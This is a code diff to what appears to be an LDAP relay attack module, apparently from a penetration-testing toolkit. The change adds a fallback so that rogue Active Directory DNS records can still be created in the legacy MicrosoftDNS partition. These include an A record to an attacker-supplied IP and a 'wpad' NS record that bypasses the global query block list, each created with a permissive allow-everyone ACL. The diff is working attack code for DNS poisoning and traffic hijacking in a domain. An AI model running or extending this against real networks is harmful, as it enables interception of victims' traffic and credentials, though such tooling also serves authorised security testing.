@@ -844,13 +844,20 @@ class LDAPAttack(ProtocolAttack):
 
         domaindn = self.client.server.info.other['defaultNamingContext'][0]
         domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+
+        # Primary: AD-Domain partition (DomainDnsZones application partition)
         dns_base_dn = 'DC=%s,CN=MicrosoftDNS,%s' % (domain, dns_naming_context)
+        # Fallback: AD-Legacy partition (CN=MicrosoftDNS,CN=System,<domainDN>)
+        dns_base_dn_legacy = 'DC=%s,CN=MicrosoftDNS,CN=System,%s' % (domain, domaindn)
 
         get_next_serial_p = partial(get_next_serial, self.client.server.address_info[0][4][0], domain)
 
         LOG.info('Checking if domain already has a `%s` DNS record' % name)
         if self.client.search(dns_base_dn, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
-            LOG.error('Domain already has a `%s` DNS record, aborting' % name)
+            LOG.error('Domain already has a `%s` DNS record in AD-Domain partition, aborting' % name)
+            return
+        if self.client.search(dns_base_dn_legacy, '(name=%s)' % escape_filter_chars(name), search_scope=ldap3.LEVEL):
+            LOG.error('Domain already has a `%s` DNS record in AD-Legacy partition, aborting' % name)
             return
 
         LOG.info('Domain does not have a `%s` record!' % name)
@@ -864,8 +871,9 @@ class LDAPAttack(ProtocolAttack):
             LOG.info('To add the `wpad` name, we need to bypass the GQBL: we\'ll first add a random `A` name and then add `wpad` as `NS` pointing to that name')
             a_record_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
 
-        # First add an A record pointing to the provided IP
-        a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
+        # ---------------------------------------------------------------
+        # Add A record – try AD-Domain partition first, fallback to Legacy
+        # ---------------------------------------------------------------
         a_record_data = {
             'dnsRecord': new_dns_record(ipaddr, "A"),
             'objectCategory': 'CN=Dns-Node,%s' % self.client.server.info.other['schemaNamingContext'][0],
@@ -874,19 +882,41 @@ class LDAPAttack(ProtocolAttack):
             'nTSecurityDescriptor': ACL_ALLOW_EVERYONE_EVERYTHING,
         }
 
-        LOG.info('Adding `A` record `%s` pointing to `%s` at `%s`' % (a_record_name, ipaddr, a_record_dn))
+        # Track which base DN was actually used (needed for NS record later)
+        active_dns_base_dn = dns_base_dn
+
+        a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn)
+        LOG.info('Adding `A` record `%s` pointing to `%s` at `%s` (AD-Domain partition)' % (a_record_name, ipaddr, a_record_dn))
+
         if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
-            LOG.error('Failed to add `A` record: %s' % str(self.client.result))
-            return
+            LOG.warning('Failed to add `A` record in AD-Domain partition: %s' % str(self.client.result))
+            LOG.info('Retrying with AD-Legacy partition (CN=MicrosoftDNS,CN=System,...)')
+
+            try:
+                active_dns_base_dn = dns_base_dn_legacy
+                a_record_dn = 'DC=%s,%s' % (a_record_name, dns_base_dn_legacy)
+
+                # Regenerate dnsRecord because get_next_serial_p fetches a new serial
+                a_record_data['dnsRecord'] = new_dns_record(ipaddr, "A")
+
+                LOG.info('Adding `A` record `%s` pointing to `%s` at `%s` (AD-Legacy partition)' % (a_record_name, ipaddr, a_record_dn))
+                if not self.client.add(a_record_dn, ['top', 'dnsNode'], a_record_data):
+                    LOG.error('Failed to add `A` record in AD-Legacy partition as well: %s' % str(self.client.result))
+                    return
+            except Exception as e:
+                LOG.error('Exception while adding `A` record in AD-Legacy partition: %s' % str(e))
+                return
 
         LOG.info('Added `A` record `%s`. DON\'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)' % a_record_name)
 
         if not is_name_wpad:
             return
 
-        # Then add the wpad NS record
+        # ---------------------------------------------------------------
+        # Add NS record for wpad – use the same partition that worked above
+        # ---------------------------------------------------------------
         ns_record_name = 'wpad'
-        ns_record_dn = 'DC=%s,%s' % (ns_record_name, dns_base_dn)
+        ns_record_dn = 'DC=%s,%s' % (ns_record_name, active_dns_base_dn)
         ns_record_value = a_record_name + "." + domain
         ns_record_data = {
             'dnsRecord': new_dns_record(ns_record_value, "NS"),
